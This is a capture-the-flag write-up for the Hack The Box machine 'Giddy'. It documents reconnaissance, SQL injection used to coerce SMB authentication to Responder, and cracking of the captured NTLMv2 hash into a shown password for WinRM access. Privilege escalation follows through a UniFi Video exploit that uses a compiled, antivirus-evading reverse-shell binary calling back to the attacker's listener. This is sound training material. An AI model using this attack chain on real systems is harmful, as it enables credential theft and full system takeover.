# Giddy

## Foothold

Nmap Results

```
┌──[Sat Nov  5 08:42:55 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
└──# rscan $ip       
rustscan --accessible -u 5000 -b 2500 -a 10.129.96.140 -- -Pn -A
...
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Issuer: commonName=PowerShellWebAccessTestWebSite
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

```

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption><p>Landing Page. Nothing of Interest.</p></figcaption></figure>

Web Directory Bruteforcing

<pre><code>┌──[Sat Nov  5 08:53:37 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
└──# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &#x3C;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.96.140/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

<strong>remote                  [Status: 302, Size: 160, Words: 6, Lines: 4, Duration: 641ms]
</strong>mvc                     [Status: 200, Size: 9902, Words: 754, Lines: 152, Duration: 3917ms]</code></pre>

<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption><p>Some Kind Store Web App</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>Entering an Apostrophe in the Search Field Confirms That It's Vulnerable to SQL Injection </p></figcaption></figure>

<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption><p>Confirmed SQL Injection</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Performing The Injection Using Burp Suite With A Different Payload To Authenticate To A Malicious SMB Service </p></figcaption></figure>

Setting Up Responder To Capture NTLMv2 Hash

```
┌──[Sat Nov  5 09:38:21 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox/giddy]
└──# /opt/Responder-3.1.3.0/Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Servers:
    SMB server                 [ON]
[+] Listening for events...
```

After Forwarding The Request We Receive The NTLMv2 Hash

{% code overflow="wrap" %}
```
[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:be355fe1b12011d2:BA1899E1BEACF1657261E50ED8E6577B:010100000000000080DE36EF5EF1D8015C461D509A7BBC0300000000020008004A00490050004E0001001E00570049004E002D004B0043005A004B00440055005800330049004F00530004003400570049004E002D004B0043005A004B00440055005800330049004F0053002E004A00490050004E002E004C004F00430041004C00030014004A00490050004E002E004C004F00430041004C00050014004A00490050004E002E004C004F00430041004C000700080080DE36EF5EF1D80106000400020000000800300030000000000000000000000000300000A11DA1EF16387B97867038AA05243D0E10C9C55070EB9A816C1A10ABEDFC5F250A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003200000000000000000000000000
```
{% endcode %}

Cracking The Hash After Saving It To File

{% code overflow="wrap" %}
```
┌──[Sat Nov  5 09:44:50 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox/giddy]
└──# hashcat -d 2 hash.txt -m 5600 --wordlist /usr/share/wordlists/rockyou.txt    
hashcat (v6.2.5-579-g634b43e62) starting
...
STACY::GIDDY:be355fe1b12011d2:ba1899e1beacf1657261e50ed8e6577b:010100000000000080de36ef5ef1d8015c461d509a7bbc0300000000020008004a00490050004e0001001e00570049004e002d004b0043005a004b00440055005800330049004f00530004003400570049004e002d004b0043005a004b00440055005800330049004f0053002e004a00490050004e002e004c004f00430041004c00030014004a00490050004e002e004c004f00430041004c00050014004a00490050004e002e004c004f00430041004c000700080080de36ef5ef1d80106000400020000000800300030000000000000000000000000300000a11da1ef16387b97867038aa05243d0e10c9c55070eb9a816c1a10abedfc5f250a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000:xNnWo6272k7x
```
{% endcode %}

Gaining Initial Foothold Through WinRM Using The Credentials

```
┌──[Sat Nov  5 09:45:29 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox/giddy]
└──# evil-winrm -i $ip -u stacy -p xNnWo6272k7x                                                                                                            1 ⨯

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Stacy\Documents>
```

## User Proof

```
*Evil-WinRM* PS C:\Users\Stacy\desktop> hostname; whoami; type user.txt; ipconfig /all
Giddy
giddy\stacy
8898ba896aa37513478407ec4ed05599

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Giddy
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-CA-04
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.129.96.140(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 9:42:12 PM
   Lease Expires . . . . . . . . . . : Sunday, November 6, 2022 1:12:42 AM
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
*Evil-WinRM* PS C:\Users\Stacy\desktop>
```

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>user.txt</p></figcaption></figure>

## Privilege Escalation

Searching For Installed Software

```
*Evil-WinRM* PS C:\programdata> cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
...
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Ubiquiti UniFi Video
...
```

Searching for **site:exploit-db.com \*Ubiquiti UniFi Video\*** reveals a potential privilege escalation exploit [https://www.exploit-db.com/exploits/43390](https://www.exploit-db.com/exploits/43390)

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation</p></figcaption></figure>

According to the exploit is it required to upload a malicious file called **taskkill.exe** to **C:\ProgramData\unifi-video\\**. I check to see if windows defender is running

```
*Evil-WinRM* PS C:\users\stacy\desktop> Get-Service windefend

Status   Name               DisplayName
------   ----               -----------
Running  windefend          Windows Defender Service
```

Since windows defender is running, I will be using ParanoidNinja's Prometheus tool [https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) and simply modify the ip and port of my attacking machine. I then proceed to compile.

{% code overflow="wrap" %}
```
┌──[Sun Nov  6 12:43:55 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/opt/prometheus]
└──# i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
{% endcode %}

With an already running malicious smb server running on my attacking machine, I upload the file

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\Users\Stacy\Documents> net use \\10.10.16.2\winreconpack /user:smbuser smbuser
The command completed successfully.
```
{% endcode %}

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\programdata\unifi-video> copy \\10.10.16.2\winreconpack\taskkill.exe
```
{% endcode %}

With the uploaded file I set up a netcat listener on port 443

```
┌──[Sun Nov  6 12:44:07 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
└──# nc -lnvp 443                                                                                                                                        130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

I now stop and start the service according to the description of the exploit and gain system privileges

```
*Evil-WinRM* PS C:\programdata\unifi-video> Stop-Service "Ubiquiti UniFi Video"; Start-Service "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
```

```
┌──[Sun Nov  6 12:44:07 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
└──# nc -lnvp 443                                                                                                                                        130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.96.140.
Ncat: Connection from 10.129.96.140:49888.

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>
```

## Root Proof

```
C:\Users\Administrator\Desktop>hostname && whoami && type root.txt && ipconfig /all
hostname && whoami && type root.txt && ipconfig /all
Giddy
nt authority\system
3eb60479156649292f1069ddc56d1a57

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Giddy
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-CA-04
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.129.96.140(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 8:42:12 PM
   Lease Expires . . . . . . . . . . : Sunday, November 6, 2022 2:42:43 PM
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

C:\Users\Administrator\Desktop>
```

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

## Badge

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
